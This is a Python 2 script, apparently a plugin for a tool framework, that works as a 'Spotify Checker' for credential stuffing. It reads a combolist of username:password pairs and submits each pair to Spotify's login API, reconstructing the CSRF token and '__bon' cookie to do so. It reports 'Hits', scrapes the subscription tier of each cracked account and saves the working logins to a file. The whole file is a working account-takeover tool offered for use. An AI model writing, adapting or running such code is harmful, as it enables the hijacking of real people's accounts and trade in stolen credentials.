#!/usr/bin/env python2
#! -*- coding: UTF-8 -*-
import os, sys, cfscrape, json
import base64
import requests as reqs
from bs4 import BeautifulSoup
from MeTh.core.modules import *
from MeTh.utils import *
from MeTH.core.exceptions import *

class Checker(Checker):
   __info__ = {
     "Name": "Spotify Checker",
     "Authors": (
                   "Mr-Z3r0"
                ),
     "Version":"0.1",
     "LastModified": "13-02-2020",
     "StartText": "Spotify checker v0.1",
     "Description": "Spotify Account checker.\n"
                    "See more in https://t.me/S0ZS78"
   }
   combo = OptString("", "Insert your combolist")
   def run(self):
      if self.combo == "":
         print_error("You must set options after run")
      else:
         self.save = raw_input("Want you save hits y/n ")
         if self.save in ["y", "yes"]:
            self.file = raw_input("File > ")
         with open(self.combo) as f:
           for lines in f:
             users, passwords = lines.split(':')
             result = self.Threat(users.strip(), passwords.strip())
             if result:
               print result
   def Threat(self, user, passw):
       self.session = reqs.Session()  
       resp = self.session.get("https://accounts.spotify.com/en/login/")
       self._get_bon(resp)
       payload = {
              "remember": False,
              "username": user,
              "password": passw,
              "csrf_token": self.session.cookies['csrf_token']
       }
       output = self.session.post("https://accounts.spotify.com/api/login", data=payload)
       if output.status_code  == 400:
         status = json.loads(output.content)
         if status["error"] == "errorInvalidCredentials":
            print("\033[1;31mDeath: {user}:{pasw}\033[0m".format(user=user, pasw=passw))
       if output.status_code == 200:
           response = self.session.get("https://spotify.com/account/overview/").text
           if "Get Premium" in response:
               subscription = "FREE"
           elif "'label': 'bundle'" in response:
               subscription = "Premium + Hulu"
           elif "Premium Family" in response:
               subscription = "Family"
           else:
              subscription = "PREMIUM"
           print("\033[1;32mHit {login}:{pasw}|{plan}\033[0m".format(login=user, pasw=passw, plan=subscription))
           if self.save in ["y", "yes"]:
             try:
               f = open(self.file, "a+")
               f.write("Hit {login}:{pasw}|{plan}\n".format(login=user, pasw=passw, plan=subscription))
               f.close()
             except:
               print_error("Can't open file")
       #return output
   def _get_bon(self, resp):
       # Get the `BON` value and process it to make the `__bon` cookie
       # https://spotifylib.readthedocs.io/en/latest/_modules/spotifylib/spotifylib.html
       try:
           bon = json.loads(resp.text.split("sp-bootstrap-data='")[-1].split("'>")[0]).get('BON', [])
       except ValueError:
          raise MeTHException("Response page can't decoded")
       if not bon:
          raise ValueError("Bon not found")
       bon.extend([bon[-1] * 42, 1, 1, 1, 1])
       # Set the cookie
       __bon =  base64.b64encode('|'.join([str(entry) for entry in bon]))
       self.session.cookies['__bon'] = __bon